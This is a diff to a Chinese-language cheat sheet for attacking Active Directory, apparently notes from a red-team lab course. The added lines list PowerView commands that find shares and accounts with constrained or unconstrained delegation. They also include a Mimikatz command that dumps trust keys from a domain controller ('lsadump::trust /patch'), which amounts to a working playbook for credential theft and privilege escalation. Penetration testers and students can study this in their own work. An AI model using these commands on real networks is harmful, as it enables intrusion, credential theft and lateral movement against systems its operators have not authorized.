@@ -153,6 +153,8 @@ Get-LastLoggedOn –ComputerName <servername>
 ## 在当前域中的主机上查找共享
 ```
 Invoke-ShareFinder –Verbose
+
+Invoke-ShareFinder -ComputerName us-dc.us.dollarcorp.moneycorp.local
 ```
 
 ## 在域中的计算机上查找敏感文件
@@ -291,6 +293,12 @@ Get-NetForestDomain -Forest eurocorp.local -Verbose | Get-NetDomainTrust
 ```
 
 
+##在DA权限的shell下枚举所有Trust tikets
+```
+Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
+```
+
+
 # User Hunting
 
 ## Find local admins on all machines of the domain (needs administrator privs on non-dc machines).（在域的所有计算机上查找本地管理员(在非 dc计算机上需要管理员权限)。）
@@ -314,4 +322,21 @@ Invoke-UserHunter -CheckAccess
 ## 查找域管理员登录的计算机
 ```
 Invoke-UserHunter -Stealth
+```
+
+# 枚举约束委派用户
+需要dev版本powerview
+```
+Get-DomainUser –TrustedToAuth
+```
+
+# 枚举约束委派的计算机，需要用dev版本Powerview
+```
+Get-DomainComputer –TrustedToAuth
+```
+
+
+# 枚举非约束委派计算机（Unconstrained Delegation），使用powerview的dev版本
+```
+Get-NetComputer -UnConstrained
 ```
